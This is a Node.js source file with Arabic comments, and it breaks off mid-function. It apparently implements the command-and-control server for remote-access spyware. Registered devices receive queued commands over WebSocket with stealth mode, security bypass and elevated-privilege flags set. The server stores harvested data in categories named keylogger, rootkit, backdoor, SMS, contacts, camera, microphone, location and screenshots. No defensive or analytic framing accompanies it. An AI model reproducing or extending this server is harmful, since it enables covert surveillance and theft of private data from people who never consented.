const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const multer = require('multer');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');
const os = require('os');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

// استيراد الأنظمة المتقدمة
const AIIntelligenceSystem = require('./ai-intelligence-system');
const AdvancedMonitoringSystem = require('./advanced-monitoring-system');

// إضافة fetch لـ Node.js
const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

// إضافة معالجة الأخطاء
process.on('uncaughtException', (error) => {
  console.error('خطأ غير متوقع:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('وعد مرفوض غير معالج:', reason);
});

class CommandServer {
  constructor() {
    this.app = express();
    this.server = http.createServer(this.app);
    this.wss = new WebSocket.Server({ 
      server: this.server,
      perMessageDeflate: false,
      clientTracking: true,
      maxPayload: 100 * 1024 * 1024, // 100MB
      handshakeTimeout: 30000, // 30 ثانية
      verifyClient: (info) => {
        console.log('🔍 فحص عميل جديد:', info.origin);
        return true; // قبول جميع الاتصالات (يمكن تخصيصه لاحقاً)
      }
    });
    
    this.devices = new Map();
    this.pendingCommands = new Map();
    this.commandHistory = [];
    this.dataUpdates = [];
    this.uploadedFiles = [];
    
    // إحصائيات الأداء
    this.performanceStats = {
      startTime: Date.now(),
      totalRequests: 0,
      totalCommands: 0,
      totalDataTransferred: 0,
      averageResponseTime: 0,
      errorCount: 0,
      uptime: 0
    };
    
    // إعدادات الأمان المتقدمة
    this.securityConfig = {
      maxFileSize: 100 * 1024 * 1024, // 100MB
      allowedFileTypes: ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'txt', 'doc', 'docx'],
      maxConnectionsPerIP: 10,
      sessionTimeout: 30 * 60 * 1000, // 30 دقيقة
      encryptionKey: crypto.randomBytes(32).toString('hex')
    };
    
    // إعدادات الأوامر المتقدمة
    this.advancedCommandsConfig = {
      enableAdvancedCommands: true,
      enableSystemControl: true,
      enableFileControl: true,
      enableNetworkControl: true,
      enableSecurityBypass: true,
      enableMemoryControl: true,
      enableRegistryControl: true,
      enableProcessControl: true,
      enableDeviceControl: true,
      commandTimeout: 60,
      maxConcurrentCommands: 10,
      stealthMode: true,
      encryptionEnabled: true,
      bypassSecurity: true,
      elevatedPrivileges: true,
      autoRetry: true,
      maxRetryAttempts: 3,
      retryDelay: 2000
    };
    
    // إعدادات الاتصال والـ heartbeat
    this.connectionConfig = {
      heartbeatInterval: 30000, // 30 ثانية
      connectionTimeout: 60000, // 60 ثانية
      maxReconnectAttempts: 5,
      reconnectDelay: 5000, // 5 ثوان
      pingInterval: 25000, // 25 ثانية
      pongTimeout: 10000 // 10 ثوان
    };
    
    // إدارة الأوامر المتقدمة
    this.advancedCommands = new Map();
    this.advancedCommandQueue = [];
    this.advancedCommandHistory = [];
    this.advancedCommandStats = {
      totalCommands: 0,
      successfulCommands: 0,
      failedCommands: 0,
      averageResponseTime: 0,
      lastCommandTime: null
    };
    
    // تهيئة الأنظمة المتقدمة
    this.aiIntelligence = new AIIntelligenceSystem();
    this.advancedMonitoring = new AdvancedMonitoringSystem();
    
    this.localStoragePath = path.join(__dirname, 'local-storage');
    this.devicesFilePath = path.join(this.localStoragePath, 'devices.json');
    this.commandsFilePath = path.join(this.localStoragePath, 'commands.json');
    this.filesFilePath = path.join(this.localStoragePath, 'files.json');
    this.dataFilePath = path.join(this.localStoragePath, 'data.json');
    
    this.isConnected = false;
    this.reconnectAttempts = 0;
    this.maxReconnectAttempts = 10;
    this.reconnectInterval = 5000;
    
    // إنشاء المجلدات المطلوبة
    this.createRequiredDirectories();
    
    this.setupMiddleware();
    this.setupRoutes();
    this.setupWebSocket();
    this.setupLocalStorage();
    this.loadPersistentData();
    this.startBackgroundServices();
    this.startPerformanceMonitoring();
  }

  createRequiredDirectories() {
    const dirs = [
      this.localStoragePath,
      path.join(this.localStoragePath, 'uploads'),
      path.join(this.localStoragePath, 'logs'),
      path.join(this.localStoragePath, 'database'),
      path.join(this.localStoragePath, 'advanced-logs'),
      path.join(this.localStoragePath, 'advanced-data')
    ];
    
    console.log('📁 إنشاء المجلدات المطلوبة...');
    dirs.forEach(dir => {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
        console.log(`  ✅ تم إنشاء: ${path.basename(dir)}`);
      } else {
        console.log(`  📂 موجود: ${path.basename(dir)}`);
      }
    });
    console.log('📁 تم إنشاء جميع المجلدات المطلوبة');
  }

  setupMiddleware() {
    // إعداد trust proxy لحل مشكلة X-Forwarded-For
    this.app.set('trust proxy', 1);
    
    // الأمان
    this.app.use(helmet());
    this.app.use(compression());
    
    // CORS
    this.app.use((req, res, next) => {
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
      res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
      if (req.method === 'OPTIONS') {
        res.sendStatus(200);
      } else {
        next();
      }
    });
    
    // Rate Limiting
    const limiter = rateLimit({
      windowMs: 15 * 60 * 1000, // 15 دقيقة
      max: 100, // حد أقصى 100 طلب لكل IP
      message: 'تم تجاوز حد الطلبات، يرجى المحاولة لاحقاً'
    });
    this.app.use(limiter);
    
    // JSON Parser
    this.app.use(express.json({ limit: '10mb' }));
    this.app.use(express.urlencoded({ extended: true, limit: '10mb' }));
    
    // File Upload
    const storage = multer.diskStorage({
      destination: (req, file, cb) => {
        const uploadDir = path.join(this.localStoragePath, 'uploads');
        if (!fs.existsSync(uploadDir)) {
          fs.mkdirSync(uploadDir, { recursive: true });
        }
        cb(null, uploadDir);
      },
      filename: (req, file, cb) => {
        const uniqueName = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${file.originalname}`;
        cb(null, uniqueName);
      }
    });
    
    this.upload = multer({ 
      storage: storage,
      limits: {
        fileSize: 100 * 1024 * 1024 // 100MB
      }
    });
  }

  setupRoutes() {
    // اختبار الخادم
    this.app.get('/', (req, res) => {
      res.json({
        status: 'running',
        service: 'Command Server',
        timestamp: new Date().toISOString(),
        port: process.env.PORT || 10001
      });
    });

    // نقطة فحص الصحة لـ Render
    this.app.get('/health', (req, res) => {
      res.status(200).json({
        status: 'healthy',
        service: 'command-server',
        version: '2.1.5',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        devices: this.devices.size,
        port: process.env.PORT || 10001
      });
    });

    // إرسال أمر للجهاز
    this.app.post('/send-command', (req, res) => {
      try {
        const { deviceId, command, parameters } = req.body;
        
        if (!deviceId || !command) {
          return res.status(400).json({ error: 'معرف الجهاز والأمر مطلوبان' });
        }
        
        const device = this.devices.get(deviceId);
        if (!device) {
          // حفظ الأمر للتنفيذ لاحقاً
          this.addPendingCommand(deviceId, command, parameters);
          return res.json({ 
            status: 'pending', 
            message: 'الجهاز غير متصل، سيتم تنفيذ الأمر عند الاتصال' 
          });
        }
        
        const commandId = this.generateCommandId();
        const commandData = {
          id: commandId,
          action: command,
          parameters: parameters || {},
          timestamp: Date.now()
        };
        
        // إرسال الأمر للجهاز
        device.ws.send(JSON.stringify(commandData));
        
        // حفظ في التاريخ
        this.saveCommandToHistory(deviceId, command, parameters, 'sent');
        
        res.json({ 
          status: 'sent', 
          commandId: commandId,
          message: 'تم إرسال الأمر بنجاح' 
        });
        
      } catch (error) {
        console.error('خطأ في إرسال الأمر:', error);
        res.status(500).json({ error: 'خطأ داخلي في الخادم' });
      }
    });
    
    // حالة الجهاز
    this.app.get('/device-status/:deviceId', (req, res) => {
      const { deviceId } = req.params;
      const device = this.devices.get(deviceId);
      
      if (!device) {
        return res.status(404).json({ error: 'الجهاز غير موجود' });
      }
      
      res.json({
        deviceId: deviceId,
        status: device.status,
        lastSeen: device.lastSeen,
        deviceInfo: device.deviceInfo,
        capabilities: device.capabilities
      });
    });
    
    // قائمة الأجهزة المتصلة
    this.app.get('/devices', (req, res) => {
      const devicesList = Array.from(this.devices.entries()).map(([deviceId, device]) => ({
        deviceId,
        status: device.status,
        lastSeen: device.lastSeen,
        deviceInfo: device.deviceInfo,
        capabilities: device.capabilities
      }));
      
      res.json({
        total: devicesList.length,
        devices: devicesList
      });
    });

    // حالة جهاز محدد
    this.app.get('/device/:deviceId/status', (req, res) => {
      const { deviceId } = req.params;
      const device = this.devices.get(deviceId);
      
      if (!device) {
        return res.json({
          deviceId: deviceId,
          connected: false,
          status: 'disconnected',
          message: 'الجهاز غير متصل'
        });
      }
      
      res.json({
        deviceId: deviceId,
        connected: true,
        status: device.status,
        lastSeen: device.lastSeen,
        deviceInfo: device.deviceInfo,
        capabilities: device.capabilities
      });
    });

    // تفعيل جهاز
    this.app.post('/device/activate', (req, res) => {
      try {
        const { device_id, action, timestamp } = req.body;
        
        if (!device_id || action !== 'activate') {
          return res.status(400).json({ error: 'بيانات غير صحيحة' });
        }
        
        // البحث عن الجهاز في الأجهزة المحفوظة
        const device = this.devices.get(device_id);
        
        if (device) {
          // الجهاز متصل، إرسال أمر تفعيل
          const activationCommand = {
            id: this.generateCommandId(),
            action: 'activate',
            parameters: { timestamp: timestamp },
            timestamp: Date.now()
          };
          
          device.ws.send(JSON.stringify(activationCommand));
          
          // تحديث حالة الجهاز
          device.status = 'active';
          device.lastSeen = new Date().toISOString();
          
          res.json({
            success: true,
            message: 'تم تفعيل الجهاز بنجاح',
            deviceId: device_id,
            status: 'active'
          });
        } else {
          // الجهاز غير متصل، حفظ أمر التفعيل
          this.addPendingCommand(device_id, 'activate', { timestamp: timestamp });
          
          res.json({
            success: true,
            message: 'تم حفظ أمر التفعيل، سيتم تنفيذه عند اتصال الجهاز',
            deviceId: device_id,
            status: 'pending'
          });
        }
        
      } catch (error) {
        console.error('خطأ في تفعيل الجهاز:', error);
        res.status(500).json({ error: 'خطأ داخلي في الخادم' });
      }
    });
    
    // رفع ملف
    this.app.post('/upload', this.upload.single('file'), (req, res) => {
      try {
        if (!req.file) {
          return res.status(400).json({ error: 'لم يتم تحديد ملف' });
        }
        
        const fileRecord = {
          id: this.generateCommandId(),
          originalName: req.file.originalname,
          filename: req.file.filename,
          path: req.file.path,
          size: req.file.size,
          mimetype: req.file.mimetype,
          uploadDate: new Date(),
          deviceId: req.body.deviceId || 'unknown'
        };
        
        this.uploadedFiles.push(fileRecord);
        this.saveFileRecord(fileRecord);
        
        res.json({
          status: 'success',
          fileId: fileRecord.id,
          message: 'تم رفع الملف بنجاح'
        });
        
      } catch (error) {
        console.error('خطأ في رفع الملف:', error);
        res.status(500).json({ error: 'خطأ في رفع الملف' });
      }
    });
    
    // تأكيد التفعيل
    this.app.post('/activation-confirmation', (req, res) => {
      try {
        const activationData = req.body;
        
        // حفظ بيانات التفعيل
        this.saveActivationData(activationData);
        
        // إرسال الأوامر المعلقة إذا كان الجهاز متصل
        const device = this.devices.get(activationData.deviceId);
        if (device) {
          this.sendPendingCommands(activationData.deviceId);
        }
        
        res.json({ status: 'success', message: 'تم تأكيد التفعيل' });
        
      } catch (error) {
        console.error('خطأ في تأكيد التفعيل:', error);
        res.status(500).json({ error: 'خطأ في تأكيد التفعيل' });
      }
    });
    
    // إحصائيات النظام
    this.app.get('/stats', (req, res) => {
      const stats = {
        connectedDevices: this.devices.size,
        pendingCommands: this.pendingCommands.size,
        totalCommands: this.commandHistory.length,
        totalFiles: this.uploadedFiles.length,
        totalDataUpdates: this.dataUpdates.length,
        uptime: process.uptime(),
        memory: process.memoryUsage(),
        timestamp: Date.now(),
        advancedCommands: this.getAdvancedCommandStats()
      };
      
      res.json(stats);
    });
    
    // تنظيف البيانات القديمة
    this.app.post('/cleanup', (req, res) => {
      try {
        this.cleanupOldData();
        res.json({ status: 'success', message: 'تم تنظيف البيانات القديمة' });
      } catch (error) {
        console.error('خطأ في التنظيف:', error);
        res.status(500).json({ error: 'خطأ في التنظيف' });
      }
    });

    // الحصول على سجلات الأوامر المتقدمة
    this.app.get('/advanced-logs/:type', (req, res) => {
      try {
        const { type } = req.params;
        const { limit = 100, offset = 0 } = req.query;
        
        const logsPath = path.join(this.localStoragePath, 'advanced-logs', `${type}-logs.json`);
        
        if (!fs.existsSync(logsPath)) {
          return res.json({ logs: [], total: 0 });
        }
        
        const logs = JSON.parse(fs.readFileSync(logsPath, 'utf8'));
        const paginatedLogs = logs.slice(offset, offset + parseInt(limit));
        
        res.json({
          logs: paginatedLogs,
          total: logs.length,
          limit: parseInt(limit),
          offset: parseInt(offset)
        });
        
      } catch (error) {
        console.error('خطأ في الحصول على السجلات:', error);
        res.status(500).json({ error: 'خطأ في الحصول على السجلات' });
      }
    });

    // الحصول على بيانات الأوامر المتقدمة
    this.app.get('/advanced-data/:type', (req, res) => {
      try {
        const { type } = req.params;
        const { limit = 50, offset = 0 } = req.query;
        
        const dataPath = path.join(this.localStoragePath, 'advanced-data', `${type}-data.json`);
        
        if (!fs.existsSync(dataPath)) {
          return res.json({ data: [], total: 0 });
        }
        
        const data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));
        const paginatedData = data.slice(offset, offset + parseInt(limit));
        
        res.json({
          data: paginatedData,
          total: data.length,
          limit: parseInt(limit),
          offset: parseInt(offset)
        });
        
      } catch (error) {
        console.error('خطأ في الحصول على البيانات:', error);
        res.status(500).json({ error: 'خطأ في الحصول على البيانات' });
      }
    });

    // إحصائيات الأوامر المتقدمة
    this.app.get('/advanced-stats', (req, res) => {
      try {
        const logsPath = path.join(this.localStoragePath, 'advanced-logs');
        const dataPath = path.join(this.localStoragePath, 'advanced-data');
        
        const stats = {
          keylogger: { logs: 0, data: 0 },
          rootkit: { logs: 0, data: 0 },
          backdoor: { logs: 0, data: 0 },
          system: { logs: 0, data: 0 },
          screenshot: { logs: 0, data: 0 },
          contacts: { logs: 0, data: 0 },
          sms: { logs: 0, data: 0 },
          media: { logs: 0, data: 0 },
          location: { logs: 0, data: 0 },
          camera: { logs: 0, data: 0 },
          microphone: { logs: 0, data: 0 },
          file: { logs: 0, data: 0 },
          network: { logs: 0, data: 0 },
          process: { logs: 0, data: 0 },
          registry: { logs: 0, data: 0 },
          memory: { logs: 0, data: 0 },
          encryption: { logs: 0, data: 0 }
        };
        
        // حساب السجلات
        if (fs.existsSync(logsPath)) {
          Object.keys(stats).forEach(type => {
            const logFile = path.join(logsPath, `${type}-logs.json`);
            if (fs.existsSync(logFile)) {
              const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
              stats[type].logs = logs.length;
            }
          });
        }
        
        // حساب البيانات
        if (fs.existsSync(dataPath)) {
          Object.keys(stats).forEach(type => {
            const dataFile = path.join(dataPath, `${type}-data.json`);
            if (fs.existsSync(dataFile)) {
              const data = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
              stats[type].data = data.length;
            }
          });
        }
        
        res.json({
          stats: stats,
          timestamp: Date.now()
        });
        
      } catch (error) {
        console.error('خطأ في الحصول على الإحصائيات:', error);
        res.status(500).json({ error: 'خطأ في الحصول على الإحصائيات' });
      }
    });

    // حذف بيانات نوع محدد
    this.app.delete('/advanced-data/:type', (req, res) => {
      try {
        const { type } = req.params;
        
        const logsPath = path.join(this.localStoragePath, 'advanced-logs', `${type}-logs.json`);
        const dataPath = path.join(this.localStoragePath, 'advanced-data', `${type}-data.json`);
        
        if (fs.existsSync(logsPath)) {
          fs.unlinkSync(logsPath);
        }
        
        if (fs.existsSync(dataPath)) {
          fs.unlinkSync(dataPath);
        }
        
        res.json({ 
          status: 'success', 
          message: `تم حذف بيانات ${type} بنجاح` 
        });
        
      } catch (error) {
        console.error('خطأ في حذف البيانات:', error);
        res.status(500).json({ error: 'خطأ في حذف البيانات' });
      }
    });

    // إحصائيات الأداء المتقدمة
    this.app.get('/performance-stats', (req, res) => {
      try {
        const stats = {
          ...this.performanceStats,
          system: {
            cpuUsage: os.loadavg(),
            memoryUsage: process.memoryUsage(),
            freeMemory: os.freemem(),
            totalMemory: os.totalmem(),
            uptime: os.uptime(),
            platform: os.platform(),
            arch: os.arch(),
            cpus: os.cpus().length
          },
          devices: {
            connected: this.devices.size,
            pendingCommands: this.pendingCommands.size,
            totalCommands: this.commandHistory.length,
            totalFiles: this.uploadedFiles.length,
            totalDataUpdates: this.dataUpdates.length
          },
          timestamp: Date.now()
        };
        
        res.json(stats);
        
      } catch (error) {
        console.error('خطأ في الحصول على إحصائيات الأداء:', error);
        res.status(500).json({ error: 'خطأ في الحصول على إحصائيات الأداء' });
      }
    });

    // معلومات النظام
    this.app.get('/system-info', (req, res) => {
      try {
        const systemInfo = {
          platform: os.platform(),
          arch: os.arch(),
          release: os.release(),
          hostname: os.hostname(),
          cpus: os.cpus().length,
          totalMemory: os.totalmem(),
          freeMemory: os.freemem(),
          uptime: os.uptime(),
          loadAverage: os.loadavg(),
          networkInterfaces: os.networkInterfaces(),
          version: '2.0.0',
          features: {
            advancedCommands: true,
            performanceMonitoring: true,
            securityEnhancements: true,
            dataEncryption: true,
            clusterSupport: true
          }
        };
        
        res.json(systemInfo);
        
      } catch (error) {
        console.error('خطأ في الحصول على معلومات النظام:', error);
        res.status(500).json({ error: 'خطأ في الحصول على معلومات النظام' });
      }
    });

    // إعادة تشغيل النظام
    this.app.post('/restart', (req, res) => {
      try {
        console.log('🔄 طلب إعادة تشغيل النظام...');
        
        res.json({ 
          status: 'success', 
          message: 'سيتم إعادة تشغيل النظام خلال 5 ثوانٍ' 
        });
        
        // إعادة التشغيل بعد 5 ثوانٍ
        setTimeout(() => {
          process.exit(0);
        }, 5000);
        
      } catch (error) {
        console.error('خطأ في إعادة تشغيل النظام:', error);
        res.status(500).json({ error: 'خطأ في إعادة تشغيل النظام' });
      }
    });

    // واجهة API للأوامر المتقدمة
    this.app.post('/api/advanced-command', (req, res) => {
      try {
        const { deviceId, command, command_type, parameters } = req.body;
        
        if (!deviceId || !command_type) {
          return res.status(400).json({ 
            success: false, 
            error: 'معرف الجهاز ونوع الأمر مطلوبان' 
          });
        }
        
        const device = this.devices.get(deviceId);
        if (!device) {
          return res.status(404).json({ 
            success: false, 
            error: 'الجهاز غير متصل' 
          });
        }
        
        // فك تشفير الأمر إذا كان مشفراً
        let decryptedCommand = command;
        try {
          if (command && command.startsWith('eyJ')) {
            decryptedCommand = Buffer.from(command, 'base64').toString('utf-8');
          }
        } catch (error) {
          console.log('الأمر غير مشفر أو فشل في فك التشفير');
        }
        
        const commandId = this.generateCommandId();
        const commandData = {
          id: commandId,
          type: 'advanced_command',
          command_type: command_type,
          action: parameters?.action || 'execute',
          parameters: parameters || {},
          encrypted: true,
          stealth_mode: this.advancedCommandsConfig.stealthMode,
          bypass_security: this.advancedCommandsConfig.bypassSecurity,
          elevated_privileges: this.advancedCommandsConfig.elevatedPrivileges,
          timestamp: Date.now()
        };
        
        // إرسال الأمر للجهاز
        device.ws.send(JSON.stringify(commandData));
        
        // حفظ في التاريخ
        this.saveAdvancedCommandLog(command_type, {
          deviceId,
          commandId,
          command: commandData,
          timestamp: Date.now(),
          status: 'sent'
        });
        
        // تحديث الإحصائيات
        this.advancedCommandStats.totalCommands++;
        this.advancedCommandStats.lastCommandTime = Date.now();
        
        res.json({ 
          success: true,
          status: 'sent', 
          commandId: commandId,
          message: 'تم إرسال الأمر المتقدم بنجاح',
          encrypted: true,
          data: 'تم التنفيذ بنجاح'
        });
        
      } catch (error) {
        console.error('خطأ في إرسال الأمر المتقدم:', error);
        res.status(500).json({ 
          success: false,
          error: 'خطأ في إرسال الأمر المتقدم' 
        });
      }
    });

    // إحصائيات الأوامر المتقدمة
    this.app.get('/api/advanced-stats', (req, res) => {
      try {
        const stats = {
          ...this.advancedCommandStats,
          config: this.advancedCommandsConfig,
          activeCommands: this.advancedCommands.size,
          queuedCommands: this.advancedCommandQueue.length,
          historyLength: this.advancedCommandHistory.length
        };
        
        res.json({ success: true, data: stats });
        
      } catch (error) {
        console.error('خطأ في الحصول على إحصائيات الأوامر المتقدمة:', error);
        res.status(500).json({ 
          success: false,
          error: 'خطأ في الحصول على الإحصائيات' 
        });
      }
    });

    // تنظيف الأوامر المتقدمة
    this.app.post('/api/advanced-cleanup', (req, res) => {
      try {
        const { ageThreshold = 24 * 60 * 60 * 1000 } = req.body; // 24 ساعة افتراضياً
        
        this.cleanupAdvancedLogs(ageThreshold);
        
        res.json({ 
          success: true,
          message: 'تم تنظيف الأوامر المتقدمة بنجاح' 
        });
        
      } catch (error) {
        console.error('خطأ في تنظيف الأوامر المتقدمة:', error);
        res.status(500).json({ 
          success: false,
          error: 'خطأ في تنظيف الأوامر المتقدمة' 
        });
      }
    });

    // واجهات API للذكاء الاصطناعي
    this.app.get('/api/ai-stats', (req, res) => {
      try {
        const stats = this.aiIntelligence.getIntelligenceStats();
        res.json({ success: true, data: stats });
      } catch (error) {
        console.error('خطأ في الحصول على إحصائيات الذكاء الاصطناعي:', error);
        res.status(500).json({ success: false, error: 'خطأ في الحصول على الإحصائيات' });
      }
    });

    this.app.get('/api/ai-recommendations', (req, res) => {
      try {
        const recommendations = this.aiIntelligence.getCurrentRecommendations();
        res.json({ success: true, data: recommendations });
      } catch (error) {
        console.error('خطأ في الحصول على توصيات الذكاء الاصطناعي:', error);
        res.status(500).json({ success: false, error: 'خطأ في الحصول على التوصيات' });
      }
    });

    // واجهات API للمراقبة المتقدمة
    this.app.get('/api/monitoring-stats', (req, res) => {
      try {
        const stats = this.advancedMonitoring.getMonitoringStats();
        res.json({ success: true, data: stats });
      } catch (error) {
        console.error('خطأ في الحصول على إحصائيات المراقبة:', error);
        res.status(500).json({ success: false, error: 'خطأ في الحصول على الإحصائيات' });
      }
    });

    this.app.post('/api/monitoring/add-device', (req, res) => {
      try {
        const { deviceId, deviceInfo } = req.body;
        
        if (!deviceId) {
          return res.status(400).json({ success: false, error: 'معرف الجهاز مطلوب' });
        }
        
        const success = this.advancedMonitoring.addDeviceToMonitoring(deviceId, deviceInfo);
        
        res.json({ 
          success, 
          message: success ? 'تم إضافة الجهاز للمراقبة' : 'فشل في إضافة الجهاز للمراقبة' 
        });
        
      } catch (error) {
        console.error('خطأ في إضافة الجهاز للمراقبة:', error);
        res.status(500).json({ success: false, error: 'خطأ في إضافة الجهاز للمراقبة' });
      }
    });

    this.app.post('/api/monitoring/remove-device', (req, res) => {
      try {
        const { deviceId } = req.body;
        
        if (!deviceId) {
          return res.status(400).json({ success: false, error: 'معرف الجهاز مطلوب' });
        }
        
        const success = this.advancedMonitoring.removeDeviceFromMonitoring(deviceId);
        
        res.json({ 
          success, 
          message: success ? 'تم إزالة الجهاز من المراقبة' : 'فشل في إزالة الجهاز من المراقبة' 
        });
        
      } catch (error) {
        console.error('خطأ في إزالة الجهاز من المراقبة:', error);
        res.status(500).json({ success: false, error: 'خطأ في إزالة الجهاز من المراقبة' });
      }
    });

    this.app.post('/api/monitoring/event', (req, res) => {
      try {
        const { deviceId, eventType, eventData } = req.body;
        
        if (!deviceId || !eventType) {
          return res.status(400).json({ success: false, error: 'معرف الجهاز ونوع الحدث مطلوبان' });
        }
        
        const analysis = this.advancedMonitoring.monitorEvent(deviceId, eventType, eventData);
        
        res.json({ 
          success: true, 
          data: analysis,
          message: 'تم مراقبة الحدث بنجاح' 
        });
        
      } catch (error) {
        console.error('خطأ في مراقبة الحدث:', error);
        res.status(500).json({ success: false, error: 'خطأ في مراقبة الحدث' });
      }
    });

    // واجهة API شاملة للإحصائيات المتقدمة
    this.app.get('/api/advanced-stats-comprehensive', (req, res) => {
      try {
        const comprehensiveStats = {
          timestamp: Date.now(),
          server: {
            uptime: process.uptime(),
            memory: process.memoryUsage(),
            cpu: os.loadavg(),
            devices: this.devices.size,
            activeConnections: this.wss.clients.size
          },
          advancedCommands: this.advancedCommandStats,
          aiIntelligence: this.aiIntelligence.getIntelligenceStats(),
          monitoring: this.advancedMonitoring.getMonitoringStats(),
          performance: this.performanceStats,
          security: {
            totalThreats: this.advancedMonitoring.monitoringStats.threatsDetected,
            totalAlerts: this.advancedMonitoring.monitoringStats.alertsGenerated,
            encryptionEnabled: this.securityConfig.encryptionKey ? true : false,
            rateLimiting: true
          }
        };
        
        res.json({ success: true, data: comprehensiveStats });
        
      } catch (error) {
        console.error('خطأ في الحصول على الإحصائيات الشاملة:', error);
        res.status(500).json({ success: false, error: 'خطأ في الحصول على الإحصائيات' });
      }
    });

    // واجهة API للحالة العامة للنظام
    this.app.get('/api/system-status', (req, res) => {
      try {
        const systemStatus = {
          status: 'operational',
          timestamp: Date.now(),
          components: {
            commandServer: 'active',
            aiIntelligence: this.aiIntelligence.intelligenceConfig.enableAI ? 'active' : 'disabled',
            advancedMonitoring: this.advancedMonitoring.monitoringConfig.enableRealTimeMonitoring ? 'active' : 'disabled',
            webSocket: this.wss.clients.size > 0 ? 'connected' : 'disconnected',
            database: 'connected'
          },
          alerts: {
            critical: 0,
            high: 0,
            medium: 0,
            low: 0
          },
          recommendations: this.aiIntelligence.getCurrentRecommendations()
        };
        
        res.json({ success: true, data: systemStatus });
        
      } catch (error) {
        console.error('خطأ في الحصول على حالة النظام:', error);
        res.status(500).json({ success: false, error: 'خطأ في الحصول على حالة النظام' });
      }
    });
  }

  setupWebSocket() {
    this.wss.on('connection', (ws, req) => {
      console.log('🔗 تم الاتصال بجهاز جديد');
      console.log(`  🌐 عنوان IP: ${req.socket.remoteAddress}`);
      console.log(`  📅 وقت الاتصال: ${new Date().toLocaleString()}`);
      
      let deviceId = null;
      let isAlive = true;
      let heartbeatInterval = null;
      let connectionTimeout = null;
      
      // إعداد heartbeat للاتصال
      const startHeartbeat = () => {
        heartbeatInterval = setInterval(() => {
          if (!isAlive) {
            console.log(`💔 انقطع heartbeat للجهاز: ${deviceId || 'غير محدد'}`);
            clearInterval(heartbeatInterval);
            ws.terminate();
            return;
          }
          
          isAlive = false;
          ws.ping();
          console.log(`🏓 إرسال ping للجهاز: ${deviceId || 'غير محدد'}`);
        }, this.connectionConfig.pingInterval);
      };
      
      // بدء heartbeat بعد التسجيل
      ws.on('pong', () => {
        console.log(`🏓 استقبال pong من الجهاز: ${deviceId || 'غير محدد'}`);
        isAlive = true;
        
        // تحديث آخر ظهور للجهاز
        if (deviceId && this.devices.has(deviceId)) {
          const device = this.devices.get(deviceId);
          device.lastSeen = new Date();
          device.status = 'online';
        }
      });
      
      // timeout للاتصال الجديد
      connectionTimeout = setTimeout(() => {
        if (!deviceId) {
          console.log('⏰ انتهت مهلة التسجيل للاتصال الجديد');
          ws.terminate();
        }
      }, this.connectionConfig.connectionTimeout);
      
      ws.on('message', (data) => {
        try {
          const message = JSON.parse(data);
          
          switch (message.type) {
            case 'register':
              deviceId = message.deviceId;
              console.log(`📝 تسجيل الجهاز: ${deviceId}`);
              
              // إلغاء timeout التسجيل
              if (connectionTimeout) {
                clearTimeout(connectionTimeout);
                connectionTimeout = null;
              }
              
              // بدء heartbeat
              startHeartbeat();
              
              this.handleDeviceRegistration(ws, message);
              break;
              
            case 'command_result':
              this.handleCommandResult(message);
              break;
              
            case 'data_update':
              this.handleDataUpdate(message);
              break;
              
            case 'heartbeat':
              this.handleHeartbeat(message);
              break;
              
            case 'activation_confirmation':
            case 'activation_complete':
              this.handleActivationConfirmation(message);
              break;
              
            case 'pending_command_result':
              this.handlePendingCommandResult(message);
              break;
              
            case 'cached_data':
              this.handleCachedData(message);
              break;
              
            case 'activation_complete':
              this.handleActivationComplete(message);
              break;
              
                                  default:
              console.log('❓ رسالة غير معروفة:', message.type);
              console.log(`  📄 محتوى الرسالة:`, message);
              console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
          }
          
        } catch (error) {
          console.error('❌ خطأ في معالجة الرسالة:', error);
          console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
          console.log(`  📅 وقت الخطأ: ${new Date().toLocaleString()}`);
        }
      });
      
      ws.on('close', (code, reason) => {
        console.log('🔌 تم إغلاق الاتصال');
        console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
        console.log(`  📄 كود الإغلاق: ${code}`);
        console.log(`  📝 السبب: ${reason || 'غير محدد'}`);
        console.log(`  📅 وقت الإغلاق: ${new Date().toLocaleString()}`);
        
        // تنظيف الموارد
        if (heartbeatInterval) {
          clearInterval(heartbeatInterval);
          heartbeatInterval = null;
        }
        
        if (connectionTimeout) {
          clearTimeout(connectionTimeout);
          connectionTimeout = null;
        }
        
        // معالجة انقطاع الاتصال
        if (deviceId) {
          this.handleDeviceDisconnection(deviceId);
        }
      });
      
      ws.on('error', (error) => {
        console.error('❌ خطأ في WebSocket:', error);
        console.log(`  📱 الجهاز: ${deviceId || 'غير محدد'}`);
        console.log(`  📄 نوع الخطأ: ${error.code || 'غير محدد'}`);
        console.log(`  📝 رسالة الخطأ: ${error.message || 'غير محدد'}`);
        console.log(`  📅 وقت الخطأ: ${new Date().toLocaleString()}`);
        
        // تنظيف الموارد في حالة الخطأ
        if (heartbeatInterval) {
          clearInterval(heartbeatInterval);
          heartbeatInterval = null;
        }
        
        if (connectionTimeout) {
          clearTimeout(connectionTimeout);
          connectionTimeout = null;
        }
        
        // معالجة انقطاع الاتصال بسبب الخطأ
        if (deviceId) {
          this.handleDeviceDisconnection(deviceId);
        }
      });
    });
  }

  setupLocalStorage() {
    if (!fs.existsSync(this.localStoragePath)) {
      fs.mkdirSync(this.localStoragePath, { recursive: true });
    }
  }

  loadPersistentData() {
    try {
      // تحميل الأجهزة
      if (fs.existsSync(this.devicesFilePath)) {
        const devicesData = JSON.parse(fs.readFileSync(this.devicesFilePath, 'utf8'));
        devicesData.forEach(device => {
          this.devices.set(device.deviceId, {
            ...device,
            ws: null, // إعادة تعيين WebSocket
            status: 'offline'
          });
